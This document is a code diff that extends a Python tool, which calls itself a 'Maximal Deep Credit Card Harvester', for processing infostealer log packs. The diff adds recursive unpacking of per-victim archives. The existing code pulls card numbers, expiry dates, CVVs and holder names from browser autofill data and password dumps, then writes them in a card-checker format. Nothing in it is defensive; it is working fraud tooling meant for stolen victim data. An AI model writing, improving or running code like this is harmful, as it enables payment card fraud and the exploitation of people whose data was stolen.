@@ -807,16 +807,50 @@ def parse_cards_from_content(content: str, cards_map: Dict[str, Tuple[str, str, 
                 if c:
                     _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])
 
+def _unpack_nested_archives(session_path: Path, max_depth: int = 3):
+    """
+    Recursively unpacks any nested ZIP/RAR/7Z archives found inside session_path.
+    Stealer log packs are often structured as outer.rar -> per-victim .zip files.
+    Unpacks in-place and deletes the archive after successful extraction.
+    """
+    ARCHIVE_EXTS = {".zip", ".rar", ".7z"}
+    for _ in range(max_depth):
+        found_any = False
+        for root, _, files in os.walk(session_path):
+            for file in sorted(files):
+                ext = Path(file).suffix.lower()
+                if ext not in ARCHIVE_EXTS:
+                    continue
+                archive_path = Path(root) / file
+                # Unpack into a sibling folder named "<stem>/"
+                dest_dir = Path(root) / Path(file).stem
+                # If the dest already exists, just delete the archive
+                if dest_dir.exists():
+                    archive_path.unlink(missing_ok=True)
+                    continue
+                success, _, _ = unpack_archive(archive_path, dest_dir, password=None)
+                if success:
+                    archive_path.unlink(missing_ok=True)
+                    found_any = True
+                # encrypted/corrupt — leave as-is, don't retry
+        if not found_any:
+            break
+
+
 def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
     """
     Maximal Deep Credit Card Harvester:
     Scans dedicated card/autofill files, Chromium SQLite Web Data, and password/dump logs.
+    Recursively unpacks nested archives (per-victim zips inside stealer packs).
     Excludes non-card system telemetry and device logs to ensure zero garbage numbers.
     Outputs in standard checker format: NUMBER|EXP_MONTH|EXP_YEAR|CVV|HOLDER||
     """
     output_file.parent.mkdir(parents=True, exist_ok=True)
     cards_map: Dict[str, Tuple[str, str, str, str]] = {}
     files_with_cards = 0
+
+    # Unpack any nested archives first (per-victim zips inside stealer packs)
+    _unpack_nested_archives(session_path)
 
     for root, _, files in os.walk(session_path):
         root_l = root.lower()
